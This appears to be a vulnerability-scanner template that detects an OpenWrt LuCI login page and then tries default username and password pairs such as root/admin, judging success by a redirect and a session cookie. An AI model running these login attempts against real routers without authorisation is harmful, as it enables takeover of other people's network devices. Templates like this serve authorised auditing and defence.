id: poc-yaml-openwrt-weak-password

info:
  name: OpenWRT Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password

variables:
  username:
    - root
    - admin
  passwd:
    - admin
    - password
    - netflixcn.com

flow: http(1) && http(2)

http:
  - id: check-openwrt
    method: GET
    path:
      - "{{BaseURL}}/cgi-bin/luci/"
    matchers:
      - type: word
        part: body
        words:
          - "OpenWrt"

  - id: attempt-login
    method: POST
    path:
      - "{{BaseURL}}/cgi-bin/luci"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    payloads:
      user:
        - "{{username}}"
      pass:
        - "{{passwd}}"
    attack: pitchfork
    body: "luci_username={{user}}&luci_password={{pass}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "sysauth="
          - "/cgi-bin/luci/"
      - type: word
        part: body
        words:
          - ""
